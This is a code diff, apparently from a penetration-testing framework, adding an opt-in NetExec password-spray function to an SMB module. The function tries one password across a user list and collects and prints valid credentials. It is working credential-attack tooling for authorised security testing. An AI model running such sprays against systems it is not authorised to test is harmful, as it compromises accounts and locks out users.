@@ -82,6 +82,37 @@ class SMBModule(BaseModule):
                 self.state.smb_findings["users"] = users
             self.state.add_artifact("netexec_rid", out_file)
 
+    def run_netexec_spray(self, proto: str, users_file: str, password: str):
+        """Opt-in password spray (one password, many users) via NetExec.
+        Only reachable interactively from `rvr --tool spray` — the automated
+        pipeline never calls this."""
+        if not self.tool_exists(self.tool("netexec")):
+            log_warn("netexec not found")
+            return
+        if not Path(users_file).exists():
+            log_warn(f"User list not found: {users_file}")
+            return
+
+        out_file = self.smb_dir / f"netexec_spray_{proto}.txt"
+        cmd = [
+            self.tool("netexec"), proto, self.state.target,
+            "-u", users_file, "-p", password,
+            "--continue-on-success",
+        ]
+        output = self.run_command(cmd, output_file=out_file, timeout=300, silent=True) or ""
+        self.state.add_artifact(f"netexec_spray_{proto}", out_file)
+
+        # netexec marks successful auths with [+] and a user:pass pair
+        hits = [l.strip() for l in output.splitlines() if "[+]" in l and ":" in l]
+        if hits:
+            self.state.smb_findings.setdefault("spray_hits", []).extend(hits[:20])
+            console.print()
+            console.print(f"  [red]✓[/red]  Spray — [bold red]{len(hits)} valid credential(s)[/bold red]")
+            for h in hits[:10]:
+                console.print(f"      [red]{h}[/red]")
+        else:
+            console.print("  [dim]✓  Spray — no valid credentials[/dim]")
+
     def _print_smb_summary(self):
         smb = self.state.smb_findings
         if not smb:
